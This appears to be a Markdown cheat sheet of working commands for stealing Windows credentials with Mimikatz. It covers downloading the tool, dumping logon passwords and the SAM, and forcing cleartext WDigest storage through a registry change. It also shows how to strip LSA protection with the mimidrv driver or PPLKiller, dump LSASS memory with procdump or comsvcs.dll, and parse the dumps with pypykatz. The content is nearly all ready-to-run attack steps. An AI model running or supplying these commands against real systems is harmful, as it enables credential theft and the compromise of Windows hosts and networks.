# 01 - Mimikatz

## 1.1 - Setup

```powershell
PS C:\> Invoke-WebRequest -UseBasicParsing -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile mimikatz_trunk.zip
Expand-Archive .\mimikatz_trunk.zip
cd mimikatz_trunk\x64
.\mimikatz.exe
```

## 1.2 - Help Menu

TODO: Copy and paste the help menu for mimikatz

`mimikatz # ::`

## 1.3 - Usage

### 1.3.1 - LogonPasswords

Make sure the `SeDebugPrivilege` is enabled

```
C:\> whoami /priv
Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Enabled

mimikatz # privilege::debug
Privilege '20' OK
```

Audit by logging the file

```
mimikatz # log credentials.txt

mimikatz # sekurlsa::logonpasswords
```

If you receive this error

```
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

Go to the **Group Policy Management Editor** -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment -> Debug programs -> then uncheck the box **"Define these policy settings:"**

### 1.3.2 - SAM

`mimikatz # lsadump::sam`

### 1.3.3 - Enable Wdigest

Otherwise another way around it is to dump with **WDigest**

`mimikatz # sekurlsa::wdigest`

If you receive this error

```
mimikatz # sekurlsa::wdigest
ERROR kuhl_m_privilege_acquireLSA ; Handle on memory (0x00000005)
```

Simply downgrades to enable mimikatz to retrieve the credentials of the windows workstation

`C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f`

`PS C:\> Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"`

### 1.3.4 - Disable LSA Protection

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_privilege_acquireLSA ; Handle on memory (0x00000005)
```

`C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL`

```
PS C:\> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Lsa -Name "RunAsPPL"

RunAsPL     : 1
```

- Method 1:

`mimikatz # !+`

Create and start a `mimidrv` service

```
C:\> sc create mimidrv binpath= C:\path\to\mimidrv.sys type= kernel start= demand

C:\> sc start mimidrv
```

```
mimikatz # !processprotect /process:lsass.exe /remove

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

mimikatz # !processprotect /process:lsass.exe

mimikatz # !-
```

- Method 2:

```
C:\> PPLKiller.exe /installDriver

C:\> PPLKiller.exe /disableLSAProtection

C:\> PPLKiller.exe /uninstallDriver
```

### 1.3.5 - Dump LSASS Process

Check if the LSASS process is present

`C:\> tasklist /fi "imagename eq lsass.exe"`

`PS C:\> get-process lsass`

#### 1.3.5.1 - Dump the process memory

- **Method 1:** Use the legit sysinternal tool

`C:\> procdump.exe /accepteula -ma <lsass_PID> hashmem.dmp`

`C:\> procdump.exe /accepteula -ma lsass.exe hashmem.dmp`

- **Method 2:** Living off the Land technique

`C:\> rundll32 comsvcs.dll,Minidump "<lsass_PID> hashmem.dmp full"`

`PS C:\> rundll32.exe comsvcs.dll,Minidump ((Get-Process lsass).Id) hashmem.dmp full`

`C:\> c:\windows\system32\rundll32.exe c:\windows\system32\comsvcs.dll,Minidump <lsass_PID> hashmem.dmp full`

#### 1.3.5.2 - Dump credentials

- **Method 1:** Using pypykatz

`$ pypykatz lsa minidump hashmem.dmp`

`$ pypykatz lsa -k /path/to/file_creds minidump hashmem.dmp`

- **Method 2:** Directly dump credentials in mimikatz

`mimikatz # sekurlsa::minidump hashmem.dmp`

Create a log file

`mimikatz # log dumpcreds.txt`

`mimikatz # sekurlsa::logonpasswords`

### 1.3.6 - List Credentials Manager

`mimikatz # sekurlsa::credman`

### 1.3.7 - List Cached Masterkeys

`mimikatz # sekurlsa::dpapi`

## References

- [Unofficial Guide to Mimimkatz & Command Reference](https://adsecurity.org/?page_id=1821)

- [IgniteTechnologies Credential Dumping](https://github.com/Ignitetechnologies/Credential-Dumping)

- [Credential Dumping Wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)

- [Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors](https://datasecurity.ucsf.edu/news/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors)

- [Invoke-WdigestDowngrade.ps1](https://gist.github.com/HarmJ0y/8fdd2d3acfbe79b730db)

- [LSASS RunAsPPL](https://itm4n.github.io/lsass-runasppl/)

- [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

- [PPLdump](https://github.com/itm4n/PPLdump)

- [LOLBAS Comsvcs](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/)

- [Attack Defenses Dumping LSASS no Mimikatz](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)

- [Configuring Additional LSA Protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)